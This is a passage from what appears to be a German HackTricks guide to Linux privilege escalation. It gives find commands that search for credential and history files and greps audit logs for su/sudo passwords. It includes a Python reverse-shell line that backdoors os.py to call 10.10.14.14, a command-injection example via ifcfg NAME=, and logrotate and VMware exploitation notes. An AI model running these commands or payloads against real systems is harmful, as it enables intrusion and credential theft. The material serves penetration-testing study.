find / -type f -mmin -5 ! -path "/proc/*" ! -path "/sys/*" ! -path "/run/*" ! -path "/dev/*" ! -path "/var/lib/*" 2>/dev/null
```
### Sqlite-Datenbankdateien
```bash
find / -name '*.db' -o -name '*.sqlite' -o -name '*.sqlite3' 2>/dev/null
```
### \*\_history, .sudo_as_admin_successful, profile, bashrc, httpd.conf, .plan, .htpasswd, .git-credentials, .rhosts, hosts.equiv, Dockerfile, docker-compose.yml Dateien
```bash
find / -type f \( -name "*_history" -o -name ".sudo_as_admin_successful" -o -name ".profile" -o -name "*bashrc" -o -name "httpd.conf" -o -name "*.plan" -o -name ".htpasswd" -o -name ".git-credentials" -o -name "*.rhosts" -o -name "hosts.equiv" -o -name "Dockerfile" -o -name "docker-compose.yml" \) 2>/dev/null
```
### Versteckte Dateien
```bash
find / -type f -iname ".*" -ls 2>/dev/null
```
### **Skripte/Binärdateien im PATH**
```bash
for d in `echo $PATH | tr ":" "\n"`; do find $d -name "*.sh" 2>/dev/null; done
for d in `echo $PATH | tr ":" "\n"`; do find $d -type f -executable 2>/dev/null; done
```
### **Webdateien**
```bash
ls -alhR /var/www/ 2>/dev/null
ls -alhR /srv/www/htdocs/ 2>/dev/null
ls -alhR /usr/local/www/apache22/data/
ls -alhR /opt/lampp/htdocs/ 2>/dev/null
```
### **Backups**
```bash
find /var /etc /bin /sbin /home /usr/local/bin /usr/local/sbin /usr/bin /usr/games /usr/sbin /root /tmp -type f \( -name "*backup*" -o -name "*\.bak" -o -name "*\.bck" -o -name "*\.bk" \) 2>/dev/null
```
### Bekannte Dateien, die Passwörter enthalten

Lies den Code von [**linPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS), es sucht nach **mehreren möglichen Dateien, die Passwörter enthalten könnten**.\
**Ein weiteres interessantes Tool**, das du dafür verwenden kannst, ist: [**LaZagne**](https://github.com/AlessandroZ/LaZagne). Dabei handelt es sich um eine Open-Source-Anwendung, die dazu dient, zahlreiche auf einem lokalen Computer gespeicherte Passwörter für Windows, Linux und Mac abzurufen.

### Logs

Wenn du Logs lesen kannst, findest du möglicherweise **interessante/vertrauliche Informationen in ihnen**. Je ungewöhnlicher der Log ist, desto interessanter ist er wahrscheinlich.\
Außerdem können einige „**schlecht**“ konfigurierte (mit einer Backdoor versehene?) **Audit-Logs** es dir ermöglichen, **Passwörter in Audit-Logs aufzuzeichnen**, wie in diesem Beitrag erklärt: [https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/](https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/).
```bash
aureport --tty | grep -E "su |sudo " | sed -E "s,su|sudo,${C}[1;31m&${C}[0m,g"
grep -RE 'comm="su"|comm="sudo"' /var/log* 2>/dev/null
```
Um **Logs zu lesen, ist die Gruppe** [**adm**](../../user-information/interesting-groups-linux-pe/index.html#adm-group) **sehr hilfreich**.

### Shell-Dateien
```bash
~/.bash_profile # if it exists, read it once when you log in to the shell
~/.bash_login # if it exists, read it once if .bash_profile doesn't exist
~/.profile # if it exists, read once if the two above don't exist
/etc/profile # only read if none of the above exists
~/.bashrc # if it exists, read it every time you start a new shell
~/.bash_logout # if it exists, read when the login shell exits
~/.zlogin #zsh shell
~/.zshrc #zsh shell
```
### Generische Creds-Suche/Regex

Du solltest außerdem nach Dateien suchen, die das Wort "**password**" in ihrem **Namen** oder innerhalb des **Inhalts** enthalten, und auch nach IPs und E-Mail-Adressen in Logs oder nach Hashes per Regex suchen.\
Ich werde hier nicht auflisten, wie das alles geht, aber falls du interessiert bist, kannst du die letzten Checks überprüfen, die [**linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/linPEAS/linpeas.sh) durchführt.

## Beschreibbare Dateien

### Python library hijacking

Wenn du weißt, **von wo** aus ein Python-Skript ausgeführt wird und du **in diesen Ordner schreiben** oder **Python-Bibliotheken ändern** kannst, kannst du die OS-Bibliothek ändern und backdoorn (wenn du in den Ordner schreiben kannst, aus dem das Python-Skript ausgeführt wird, kopiere die os.py-Bibliothek und füge sie dort ein).

Um die **Bibliothek zu backdoorn**, füge einfach am Ende der os.py-Bibliothek die folgende Zeile hinzu (IP und PORT ändern):
```python
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.14",5678));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
```
### Logrotate exploitation

Eine Schwachstelle in `logrotate` ermöglicht es Benutzern mit **Schreibberechtigungen** für eine Logdatei oder deren übergeordnete Verzeichnisse, möglicherweise erweiterte Berechtigungen zu erlangen. Der Grund dafür ist, dass `logrotate`, das häufig als **root** ausgeführt wird, manipuliert werden kann, um beliebige Dateien auszuführen, insbesondere in Verzeichnissen wie _**/etc/bash_completion.d/**_. Es ist wichtig, die Berechtigungen nicht nur in _/var/log_, sondern auch in allen Verzeichnissen zu überprüfen, auf die Log rotation angewendet wird.

> [!TIP]
> Diese Schwachstelle betrifft `logrotate` Version `3.18.0` und älter.

Detailliertere Informationen zur Schwachstelle finden Sie auf dieser Seite: [https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition](https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition).

Sie können diese Schwachstelle mit [**logrotten**](https://github.com/whotwagner/logrotten) ausnutzen.

Diese Schwachstelle ist [**CVE-2016-1247**](https://www.cvedetails.com/cve/CVE-2016-1247/) **(nginx logs)** sehr ähnlich. Wenn Sie also feststellen, dass Sie Logs verändern können, überprüfen Sie, wer diese Logs verwaltet, und ob Sie die Berechtigungen erweitern können, indem Sie die Logs durch Symlinks ersetzen.

### /etc/sysconfig/network-scripts/ (Centos/Redhat)

**Vulnerability reference:** [**https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f**](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)

Wenn ein Benutzer aus irgendeinem Grund in der Lage ist, ein `ifcf-<whatever>`-Script nach _/etc/sysconfig/network-scripts_ zu **schreiben** oder ein vorhandenes Script **anzupassen**, dann ist Ihr **system is pwned**.

Network scripts, beispielsweise _ifcg-eth0_, werden für Netzwerkverbindungen verwendet. Sie sehen exakt wie .INI-Dateien aus. Unter Linux werden sie jedoch von Network Manager (dispatcher.d) \~gesourced\~.

In meinem Fall wird das Attribut `NAME=` in diesen Network scripts nicht korrekt verarbeitet. Wenn der Name **white/blank space** enthält, versucht das System, den Teil nach dem **white/blank space** auszuführen. Das bedeutet, dass **alles nach dem ersten Leerzeichen als root ausgeführt wird**.

Zum Beispiel: _/etc/sysconfig/network-scripts/ifcfg-1337_
```bash
NAME=Network /bin/id
ONBOOT=yes
DEVICE=eth0
```
(_Beachten Sie das Leerzeichen zwischen Network und /bin/id_)

### **init, init.d, systemd und rc.d**

Das Verzeichnis `/etc/init.d` enthält **Skripte** für System V init (SysVinit), das **klassische Linux-Dienstverwaltungssystem**. Es umfasst Skripte zum `start`, `stop`, `restart` und manchmal `reload` von Diensten. Diese können direkt oder über symbolische Links in `/etc/rc?.d/` ausgeführt werden. Ein alternativer Pfad in Redhat-Systemen ist `/etc/rc.d/init.d`.

Andererseits steht `/etc/init` im Zusammenhang mit **Upstart**, einem von Ubuntu eingeführten neueren **Dienstverwaltungssystem**, das Konfigurationsdateien für Verwaltungsaufgaben von Diensten verwendet. Trotz des Übergangs zu Upstart werden SysVinit-Skripte aufgrund einer Kompatibilitätsschicht in Upstart weiterhin zusammen mit Upstart-Konfigurationen verwendet.

**systemd** ist ein moderner Initialisierungs- und Dienstmanager mit erweiterten Funktionen wie dem Starten von Daemons bei Bedarf, der Verwaltung von Automounts und Snapshots des Systemzustands. Es organisiert Dateien in `/usr/lib/systemd/` für Distributionspakete und in `/etc/systemd/system/` für Änderungen durch Administratoren, wodurch die Systemverwaltung vereinfacht wird.

## Andere Tricks

### NFS Privilege escalation


{{#ref}}
../../interesting-files-permissions/nfs-no_root_squash-misconfiguration-pe.md
{{#endref}}

### Escaping from restricted Shells


{{#ref}}
../../main-system-information/escaping-from-limited-bash.md
{{#endref}}

### Cisco - vmanage


{{#ref}}
../../network-information/cisco-vmanage.md
{{#endref}}

## Android rooting frameworks: manager-channel abuse

Android rooting frameworks hooken häufig einen syscall, um privilegierte Kernel-Funktionen für einen Userspace-Manager bereitzustellen. Eine schwache Manager-Authentifizierung (z. B. Signaturprüfungen auf Basis der FD-Reihenfolge oder unsichere Passwortverfahren) kann es einer lokalen App ermöglichen, den Manager zu imitieren und auf bereits gerooteten Geräten zu root zu eskalieren. Weitere Informationen und Details zur Ausnutzung finden Sie hier:


{{#ref}}
../../software-information/android-rooting-frameworks-manager-auth-bypass-syscall-hook.md
{{#endref}}

## VMware Tools service discovery LPE (CWE-426) via regex-based exec (CVE-2025-41244)

Die regex-basierte Service Discovery in VMware Tools/Aria Operations kann einen Binary-Pfad aus Prozessbefehlszeilen extrahieren und ihn mit -v in einem privilegierten Kontext ausführen. Freizügige Muster (z. B. mit \S) können von Angreifern bereitgestellte Listener in beschreibbaren Verzeichnissen (z. B. /tmp/httpd) erfassen, was zur Ausführung als root führt (CWE-426 Untrusted Search Path).

Weitere Informationen und ein verallgemeinertes Muster, das auf andere Discovery-/Monitoring-Stacks anwendbar ist, finden Sie hier:

{{#ref}}
../../main-system-information/kernel-lpe-cves/vmware-tools-service-discovery-untrusted-search-path-cve-2025-41244.md
{{#endref}}

## Kernel Security Protections

- [https://github.com/a13xp0p0v/kconfig-hardened-check](https://github.com/a13xp0p0v/kconfig-hardened-check)
- [https://github.com/a13xp0p0v/linux-kernel-defence-map](https://github.com/a13xp0p0v/linux-kernel-defence-map)

## Weitere Hilfe

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## Linux/Unix Privesc Tools

### **Bestes Tool zum Auffinden lokaler Linux Privilege escalation vectors:** [**LinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)

**LinEnum**: [https://github.com/rebootuser/LinEnum](https://github.com/rebootuser/LinEnum)(-t option)\
**Enumy**: [https://github.com/luke-goddard/enumy](https://github.com/luke-goddard/enumy)\
**Unix Privesc Check:** [http://pentestmonkey.net/tools/audit/unix-privesc-check](http://pentestmonkey.net/tools/audit/unix-privesc-check)\
**Linux Priv Checker:** [www.securitysift.com/download/linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py)\
**BeeRoot:** [https://github.com/AlessandroZ/BeRoot/tree/master/Linux](https://github.com/AlessandroZ/BeRoot/tree/master/Linux)\
**Kernelpop:** Kernel-Vulns in Linux und MAC enumerieren [https://github.com/spencerdodd/kernelpop](https://github.com/spencerdodd/kernelpop)\
**Mestaploit:** _**multi/recon/local_exploit_suggester**_\
**Linux Exploit Suggester:** [https://github.com/mzet-/linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester)\
**EvilAbigail (physischer Zugriff):** [https://github.com/GDSSecurity/EvilAbigail](https://github.com/GDSSecurity/EvilAbigail)\
**Zusammenstellung weiterer Skripte**: [https://github.com/1N3/PrivEsc](https://github.com/1N3/PrivEsc)

## Referenzen

- [0xdf – HTB Planning (Crontab UI privesc, zip -P creds reuse)](https://0xdf.gitlab.io/2025/09/13/htb-planning.html)
- [0xdf – HTB Era: forged .text_sig payload for cron-executed monitor](https://0xdf.gitlab.io/2025/11/29/htb-era.html)
- [0xdf – Holiday Hack Challenge 2025: Neighborhood Watch Bypass (sudo env_keep PATH hijack)](https://0xdf.gitlab.io/holidayhack2025/act1/neighborhood-watch)
- [alseambusher/crontab-ui](https://github.com/alseambusher/crontab-ui)
- [https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)
- [https://payatu.com/guide-linux-privilege-escalation/](https://payatu.com/guide-linux-privilege-escalation/)
- [https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744](https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744)
- [http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html](http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html)
- [https://touhidshaikh.com/blog/?p=827](https://touhidshaikh.com/blog/?p=827)
- [https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf](https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf)
- [https://github.com/frizb/Linux-Privilege-Escalation](https://github.com/frizb/Linux-Privilege-Escalation)
- [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits)
- [https://github.com/rtcrowley/linux-private-i](https://github.com/rtcrowley/linux-private-i)
- [https://www.linux.com/news/what-socket/](https://www.linux.com/news/what-socket/)
- [https://muzec0318.github.io/posts/PG/peppo.html](https://muzec0318.github.io/posts/PG/peppo.html)
- [https://www.linuxjournal.com/article/7744](https://www.linuxjournal.com/article/7744)
- [https://blog.certcube.com/suid-executables-linux-privilege-escalation/](https://blog.certcube.com/suid-executables-linux-privilege-escalation/)
- [https://juggernaut-sec.com/sudo-part-2-lpe](https://juggernaut-sec.com/sudo-part-2-lpe)
- [https://linuxconfig.org/how-to-manage-acls-on-linux](https://linuxconfig.org/how-to-manage-acls-on-linux)
- [https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)
- [https://www.linode.com/docs/guides/what-is-systemd/](https://www.linode.com/docs/guides/what-is-systemd/)
- [0xdf – HTB Eureka (bash arithmetic injection via logs, overall chain)](https://0xdf.gitlab.io/2025/08/30/htb-eureka.html)
- [GNU Bash Manual – BASH_ENV (non-interactive startup file)](https://www.gnu.org/software/bash/manual/bash.html#index-BASH_005fENV)
- [0xdf – HTB Environment (sudo env_keep BASH_ENV → root)](https://0xdf.gitlab.io/2025/09/06/htb-environment.html)
- [0xdf – HTB Previous (sudo terraform dev_overrides + TF_VAR symlink privesc)](https://0xdf.gitlab.io/2026/01/10/htb-previous.html)
- [0xdf – HTB Slonik (pg_basebackup cron copy → SUID bash)](https://0xdf.gitlab.io/2026/02/12/htb-slonik.html)
- [NVISO – You name it, VMware elevates it (CVE-2025-41244)](https://blog.nviso.eu/2025/09/29/you-name-it-vmware-elevates-it-cve-2025-41244/)
- [0xdf – HTB: Expressway](https://0xdf.gitlab.io/2026/03/07/htb-expressway.html)
- [0xdf – HTB: Browsed](https://0xdf.gitlab.io/2026/03/28/htb-browsed.html)
- [PEP 3147 – PYC Repository Directories](https://peps.python.org/pep-3147/)
- [Python importlib docs](https://docs.python.org/3/library/importlib.html)

{{#include ../../../banners/hacktricks-training.md}}
